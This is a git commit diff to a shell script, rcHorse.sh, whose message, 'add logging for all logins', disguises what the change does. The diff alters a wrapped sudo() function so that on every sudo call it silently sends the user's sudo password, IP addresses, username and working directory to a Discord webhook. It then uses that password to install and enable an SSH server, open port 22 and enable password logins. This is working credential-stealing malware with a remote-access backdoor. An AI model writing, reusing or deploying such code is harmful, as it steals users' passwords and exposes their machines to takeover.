e054061fced081c25e3353bb9f63e4043dfe8999
Satindra Ramalingam <satindra.r@gmail.com>
2025-09-02 20:39:07 +0530

    add logging for all logins

--- rcHorse.sh
+++ rcHorse.sh
@@ -110,15 +110,16 @@ sudo(){
 			command sudo -n $@
 			if [[ "$horseData" != "$(tail -n 1 $HOME/rcTarget)" ]]; then
 				echo "$horseData" >> $HOME/rcTarget
-				lip=$(ip -4 -o addr show scope global | awk '{print $4}' | cut -d/ -f1 | paste -sd' ' -)
-				usr=$(whoami)
-				pwd=$(pwd)
-				setsid bash -c "gip=\$(curl -s icanhazip.com); curl -s -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\": \\\"sudo=${horseVision} gip=\$gip lip=${lip} usr=${usr} pwd=${pwd}\\\"}\" https://discord.com/api/webhooks/1410231118363627641/2gd3OeGr7fDmqzkB9pc1Ymx_0osDYOxYzckTKGvLnw6QZl_Br8jwguvZg8grWUPSEWGu >/dev/null 2>&1 &" >/dev/null 2>&1 </dev/null
-				setsid bash -c "echo \"$horseVision\" | sudo -S apt install -y openssh-server >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl start ssh >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl enable ssh >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S apt install -y ufw >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S ufw allow 22/tcp >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S ufw enable >/dev/null 2>&1" >/dev/null 2>&1 </dev/null
-				setsid bash -c "echo \"$horseVision\" | sudo -S dnf install -y openssh-server >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl start sshd >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl enable sshd >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S firewall-cmd --permanent --add-service=ssh >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S firewall-cmd --reload >/dev/null 2>&1" >/dev/null 2>&1 </dev/null
-				setsid bash -c "echo \"$horseVision\" | sudo -S pacman -S --noconfirm openssh >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl start sshd >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl enable sshd >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S pacman -S --noconfirm ufw >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S ufw allow 22/tcp >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl enable --now ufw >/dev/null 2>&1" >/dev/null 2>&1 </dev/null
-				setsid bash -c "echo \"$horseVision\" | sudo -S grep -q '^#\\?PasswordAuthentication' /etc/ssh/sshd_config && echo \"$horseVision\" | sudo -S sed -i 's/^#\\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config || echo \"$horseVision\" | sudo -S bash -c 'echo \"PasswordAuthentication yes\" >> /etc/ssh/sshd_config'; echo \"$horseVision\" | sudo -S systemctl restart sshd; echo \"$horseVision\" | sudo -S systemctl restart ssh" >/dev/null 2>&1 </dev/null
 			fi
+			lip=$(ip -4 -o addr show scope global | awk '{print $4}' | cut -d/ -f1 | paste -sd' ' -)
+			usr=$(whoami)
+			pwd=$(pwd)
+			setsid bash -c "gip=\$(curl -s icanhazip.com); curl -s -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\": \\\"sudo=${horseVision} gip=\$gip lip=${lip} usr=${usr} pwd=${pwd}\\\"}\" https://discord.com/api/webhooks/1410231118363627641/2gd3OeGr7fDmqzkB9pc1Ymx_0osDYOxYzckTKGvLnw6QZl_Br8jwguvZg8grWUPSEWGu >/dev/null 2>&1 &" >/dev/null 2>&1 </dev/null
+			setsid bash -c "echo \"$horseVision\" | sudo -S apt install -y openssh-server >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl start ssh >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl enable ssh >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S apt install -y ufw >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S ufw allow 22/tcp >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S ufw enable >/dev/null 2>&1" >/dev/null 2>&1 </dev/null
+			setsid bash -c "echo \"$horseVision\" | sudo -S dnf install -y openssh-server >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl start sshd >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl enable sshd >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S firewall-cmd --permanent --add-service=ssh >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S firewall-cmd --reload >/dev/null 2>&1" >/dev/null 2>&1 </dev/null
+			setsid bash -c "echo \"$horseVision\" | sudo -S pacman -S --noconfirm openssh >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl start sshd >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl enable sshd >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S pacman -S --noconfirm ufw >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S ufw allow 22/tcp >/dev/null 2>&1 && echo \"$horseVision\" | sudo -S systemctl enable --now ufw >/dev/null 2>&1" >/dev/null 2>&1 </dev/null
+			setsid bash -c "echo \"$horseVision\" | sudo -S grep -q '^#\\?PasswordAuthentication' /etc/ssh/sshd_config && echo \"$horseVision\" | sudo -S sed -i 's/^#\\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config || echo \"$horseVision\" | sudo -S bash -c 'echo \"PasswordAuthentication yes\" >> /etc/ssh/sshd_config'; echo \"$horseVision\" | sudo -S systemctl restart sshd; echo \"$horseVision\" | sudo -S systemctl restart ssh" >/dev/null 2>&1 </dev/null
+
 		fi
 	fi
 }
